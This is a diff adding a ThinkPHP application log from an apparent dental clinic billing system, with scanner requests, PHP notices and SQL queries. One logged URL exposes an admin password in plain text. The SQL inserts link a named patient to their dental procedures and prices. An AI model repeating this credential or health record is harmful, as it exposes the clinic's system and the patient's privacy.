@@ -1,0 +1,2009 @@
+[ 2018-07-04T02:44:28+08:00 ] 80.82.78.50 /cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000111s ]
+
+[ 2018-07-04T05:22:36+08:00 ] 220.191.249.52 /manager/html
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000120s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000045s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000101s ]
+ERR: 无法加载控制器:Manager
+
+[ 2018-07-04T09:17:21+08:00 ] 80.82.70.187 /cache/global/img/gs.gif
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000129s ]
+
+[ 2018-07-04T09:57:15+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000114s ]
+
+[ 2018-07-04T10:50:38+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000130s ]
+
+[ 2018-07-04T10:50:40+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000121s ]
+
+[ 2018-07-04T11:00:16+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000114s ]
+
+[ 2018-07-04T11:06:58+08:00 ] 1.192.65.221 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000118s ]
+
+[ 2018-07-04T11:07:02+08:00 ] 1.192.65.221 /index/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000055s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000117s ]
+
+[ 2018-07-04T11:07:02+08:00 ] 1.192.65.221 /login/nolog
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000104s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000086s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000040s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000094s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.001174s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.001230s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000041s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000084s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000033s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000077s ]
+
+[ 2018-07-04T11:07:02+08:00 ] 1.192.65.221 /login/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000085s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000048s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000102s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.001494s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.001558s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000035s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000078s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000036s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000079s ]
+
+[ 2018-07-04T11:07:02+08:00 ] 1.192.65.221 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000102s ]
+
+[ 2018-07-04T11:07:05+08:00 ] 1.192.65.221 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000118s ]
+
+[ 2018-07-04T11:07:11+08:00 ] 1.192.65.221 /login/login?username=admin&pwd=mxl12468
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000043s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000090s ]
+NOTIC: [8] A session had already been started - ignoring session_start() /usr/share/nginx/html/ThinkPHP/Common/functions.php 第 1263 行.
+SQL: SHOW COLUMNS FROM `md_admin` [ RunTime:0.0007s ]
+SQL: SELECT `id`,`username`,`pwd`,`ifadmin`,`ifuse` FROM `md_admin` WHERE ( username='admin' ) LIMIT 1   [ RunTime:0.0003s ]
+
+[ 2018-07-04T11:07:11+08:00 ] 1.192.65.221 /index/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000032s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000109s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000039s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000092s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.001517s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.001582s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000042s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000087s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000046s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000097s ]
+
+[ 2018-07-04T11:07:11+08:00 ] 1.192.65.221 /Home/index/top
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000090s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000034s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000084s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000045s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000104s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.001393s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.001454s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000042s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000099s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000035s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000082s ]
+
+[ 2018-07-04T11:07:11+08:00 ] 1.192.65.221 /Home/index/menu
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000101s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000090s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000068s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000165s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003259s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003314s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000046s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000094s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000047s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000125s ]
+
+[ 2018-07-04T11:07:11+08:00 ] 1.192.65.221 /Home/index/main
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000029s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000127s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000062s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000146s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000040s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000094s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.001045s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.001111s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000039s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000085s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000032s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000078s ]
+
+[ 2018-07-04T11:07:11+08:00 ] 1.192.65.221 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000116s ]
+
+[ 2018-07-04T11:07:14+08:00 ] 120.194.3.98 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+
+[ 2018-07-04T11:07:15+08:00 ] 1.192.65.221 /word/in
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000040s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000093s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000106s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000167s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003032s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003103s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000055s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000122s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000054s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000113s ]
+
+[ 2018-07-04T11:07:28+08:00 ] 1.192.65.221 /Home//upload/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000115s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000036s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000098s ]
+NOTIC: [2] call_user_func() expects parameter 1 to be a valid callback, no array or string given /usr/share/nginx/html/ThinkPHP/Library/Think/Upload.class.php 第 170 行.
+
+[ 2018-07-04T11:07:31+08:00 ] 1.192.65.221 /word/importPatient?filename=201807%2F5b3c39f0c96c9.xlsx&random=0.8126233878698968
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000112s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000038s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000085s ]
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+NOTIC: [8] Undefined variable: options /usr/share/nginx/html/ThinkPHP/Library/Vendor/PHPExcel/Settings.php 第 384 行.
+SQL: SHOW COLUMNS FROM `md_patient_medicine` [ RunTime:0.0006s ]
+SQL: SHOW COLUMNS FROM `md_medicine` [ RunTime:0.0005s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）锥体束X线计算机扫描' and isdel=1 ) LIMIT 1   [ RunTime:0.0074s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','（中原口腔）锥体束X线计算机扫描','220.5',NULL,'0','2018-07-04 11:07:30','0') [ RunTime:0.0024s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='（中原口腔）数字化摄影（DR)' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','（中原口腔）数字化摄影（DR)','28',NULL,'0','2018-07-04 11:07:30','0') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='全口牙病系统检查与治疗设计' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','全口牙病系统检查与治疗设计','20',NULL,'0','2018-07-04 11:07:30','2344') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='树脂粘结' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','树脂粘结','400',NULL,'0','2018-07-04 11:07:30','0') [ RunTime:0.0024s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='牙再植术' and isdel=1 ) LIMIT 1   [ RunTime:0.0021s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','牙再植术','292',NULL,'0','2018-07-04 11:07:30','4767') [ RunTime:0.0020s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='牙外伤结扎固定术' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','牙外伤结扎固定术','84',NULL,'0','2018-07-04 11:07:30','2370') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='调' and isdel=1 ) LIMIT 1   [ RunTime:0.0072s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','调','20.8',NULL,'0','2018-07-04 11:07:30','0') [ RunTime:0.0027s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='高速手机制备术' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','高速手机制备术','40',NULL,'0','2018-07-04 11:07:30','0') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='咬合检查' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','咬合检查','20',NULL,'0','2018-07-04 11:07:30','2345') [ RunTime:0.0023s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='全口牙病系统检查与治疗设计' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','全口牙病系统检查与治疗设计','20',NULL,'0','2018-07-04 11:07:30','2344') [ RunTime:0.0013s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='局部浸润麻醉' and isdel=1 ) LIMIT 1   [ RunTime:0.0016s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','局部浸润麻醉','140',NULL,'0','2018-07-04 11:07:30','3460') [ RunTime:0.0013s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='牙髓活力测量书' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','牙髓活力测量书','200',NULL,'0','2018-07-04 11:07:30','0') [ RunTime:0.0014s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='口腔护理' and isdel=1 ) LIMIT 1   [ RunTime:0.0022s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','口腔护理','9',NULL,'0','2018-07-04 11:07:30','5129') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='髓腔消毒术' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','髓腔消毒术','22',NULL,'0','2018-07-04 11:07:30','2387') [ RunTime:0.0013s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='牙髓摘除术' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','牙髓摘除术','26',NULL,'0','2018-07-04 11:07:30','2384') [ RunTime:0.0024s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='根管长度测量' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','根管长度测量','8.800000000000001',NULL,'0','2018-07-04 11:07:30','2351') [ RunTime:0.0013s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='根管预备' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','根管预备','31',NULL,'0','2018-07-04 11:07:30','2385') [ RunTime:0.0016s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='橡皮障隔湿法' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','橡皮障隔湿法','17',NULL,'0','2018-07-04 11:07:30','2379') [ RunTime:0.0014s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='口腔局部冲洗上药' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','口腔局部冲洗上药','7.8',NULL,'0','2018-07-04 11:07:30','2365') [ RunTime:0.0025s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='简单充填术' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','简单充填术','42',NULL,'0','2018-07-04 11:07:30','2445') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='髓腔消毒术' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','髓腔消毒术','22',NULL,'0','2018-07-04 11:07:30','2387') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='牙髓摘除术' and isdel=1 ) LIMIT 1   [ RunTime:0.0013s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','牙髓摘除术','26',NULL,'0','2018-07-04 11:07:30','2384') [ RunTime:0.0028s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='根管长度测量' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','根管长度测量','8.800000000000001',NULL,'0','2018-07-04 11:07:30','2351') [ RunTime:0.0017s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='根管预备' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','根管预备','31',NULL,'0','2018-07-04 11:07:30','2385') [ RunTime:0.0017s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='口腔局部冲洗上药' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','口腔局部冲洗上药','7.8',NULL,'0','2018-07-04 11:07:30','2365') [ RunTime:0.0025s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='简单充填术' and isdel=1 ) LIMIT 1   [ RunTime:0.0012s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','简单充填术','42',NULL,'0','2018-07-04 11:07:30','2445') [ RunTime:0.0015s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='开髓引流术' and isdel=1 ) LIMIT 1   [ RunTime:0.0011s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','开髓引流术','52',NULL,'0','2018-07-04 11:07:30','2382') [ RunTime:0.0019s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='超声龈上洁治术' and isdel=1 ) LIMIT 1   [ RunTime:0.0071s ]
+SQL: INSERT INTO `md_patient_medicine` (`patient_batchid`,`patient_name`,`medicine_name`,`medicine_price`,`medicine_num`,`sheetnum`,`addtime`,`medicine_id`) VALUES ('6e44dd57748c98968f4e2918c54e41a8','鲁迅康','超声龈上洁治术','40',NULL,'0','2018-07-04 11:07:30','0') [ RunTime:0.0020s ]
+SQL: SELECT * FROM `md_medicine` WHERE ( medicine_name='0.9%氯化钠注射液' and isdel=1 ) LIMIT 1   [ RunTime:0.0054s ]
